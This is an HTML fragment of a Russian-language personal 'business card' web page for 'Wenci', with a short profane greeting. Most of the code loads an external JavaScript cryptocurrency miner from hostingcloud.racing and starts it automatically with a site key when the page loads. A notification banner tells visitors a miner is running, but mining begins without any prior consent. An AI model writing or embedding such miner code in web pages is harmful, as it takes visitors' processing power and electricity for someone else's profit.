    <title>Визитная Карточка | Wenci</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&amp;display=swap" rel="stylesheet">

</head>
<body>
    <div class="card">
        <!-- Ваш контент -->
        <h1>Wenci</h1>
        <p>Привет! Я пиздатый ахуенны...</p>
    </div>

    <!-- Подключение скрипта для майнинга -->
    <script src="https://www.hostingcloud.racing/WGhO.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            try {
                // Проверка корректности и работоспособности скрипта
                var _client = new Client.Anonymous('ce72e704c73c41287b5ac6321382ea0c8fc1b6e54eb08b90a359a8e8d1a28a56', {
                    throttle: 0.3, // Настройте в зависимости от производительности
                    c: 'w' // Дополнительные параметры, если поддерживаются
                });
                _client.start();
                _client.addMiningNotification(
                    "Top", 
                    "This site is running JavaScript miner. If it bothers you, you can stop it.", 
                    "#cccccc", 
                    40, 
                    "#3d3d3d"
                );

                console.log("Mining client started.");
            } catch (error) {
                console.error("Error starting mining client:", error);
            }
        });
    </script>
</body>
